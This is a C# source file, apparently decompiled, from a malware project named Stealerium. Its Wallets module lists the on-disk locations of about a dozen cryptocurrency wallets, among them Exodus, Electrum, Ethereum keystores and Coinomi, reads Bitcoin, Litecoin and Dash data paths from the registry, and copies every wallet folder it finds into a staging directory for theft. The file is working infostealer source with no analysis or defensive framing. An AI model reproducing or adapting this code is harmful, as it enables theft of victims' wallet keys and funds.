using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using Stealerium.Helpers;

namespace Stealerium.Target;

internal sealed class Wallets
{
	private static readonly List<string[]> SWalletsDirectories = new List<string[]>
	{
		new string[2]
		{
			"Zcash",
			Paths.Appdata + "\\Zcash"
		},
		new string[2]
		{
			"Armory",
			Paths.Appdata + "\\Armory"
		},
		new string[2]
		{
			"Bytecoin",
			Paths.Appdata + "\\bytecoin"
		},
		new string[2]
		{
			"Jaxx",
			Paths.Appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"
		},
		new string[2]
		{
			"Exodus",
			Paths.Appdata + "\\Exodus\\exodus.wallet"
		},
		new string[2]
		{
			"Ethereum",
			Paths.Appdata + "\\Ethereum\\keystore"
		},
		new string[2]
		{
			"Electrum",
			Paths.Appdata + "\\Electrum\\wallets"
		},
		new string[2]
		{
			"AtomicWallet",
			Paths.Appdata + "\\atomic\\Local Storage\\leveldb"
		},
		new string[2]
		{
			"Guarda",
			Paths.Appdata + "\\Guarda\\Local Storage\\leveldb"
		},
		new string[2]
		{
			"Coinomi",
			Paths.Lappdata + "\\Coinomi\\Coinomi\\wallets"
		}
	};

	private static readonly string[] SWalletsRegistry = new string[3] { "Litecoin", "Dash", "Bitcoin" };

	public static void GetWallets(string sSaveDir)
	{
		try
		{
			Directory.CreateDirectory(sSaveDir);
			foreach (string[] sWalletsDirectory in SWalletsDirectories)
			{
				CopyWalletFromDirectoryTo(sSaveDir, sWalletsDirectory[1], sWalletsDirectory[0]);
			}
			string[] sWalletsRegistry = SWalletsRegistry;
			foreach (string sWalletRegistry in sWalletsRegistry)
			{
				CopyWalletFromRegistryTo(sSaveDir, sWalletRegistry);
			}
			if (Counter.Wallets == 0)
			{
				Filemanager.RecursiveDelete(sSaveDir);
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Wallets >> Failed collect wallets\n" + ex);
		}
	}

	private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
	{
		string destFolder = Path.Combine(sSaveDir, sWalletName);
		if (Directory.Exists(sWalletDir))
		{
			Filemanager.CopyDirectory(sWalletDir, destFolder);
			Counter.Wallets++;
		}
	}

	private static void CopyWalletFromRegistryTo(string sSaveDir, string sWalletRegistry)
	{
		string destFolder = Path.Combine(sSaveDir, sWalletRegistry);
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey(sWalletRegistry)?.OpenSubKey(sWalletRegistry + "-Qt");
			if (registryKey != null)
			{
				string text = registryKey.GetValue("strDataDir")?.ToString() + "\\wallets";
				if (Directory.Exists(text))
				{
					Filemanager.CopyDirectory(text, destFolder);
					Counter.Wallets++;
				}
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Wallets >> Failed to collect wallet from registry\n" + ex);
		}
	}
}
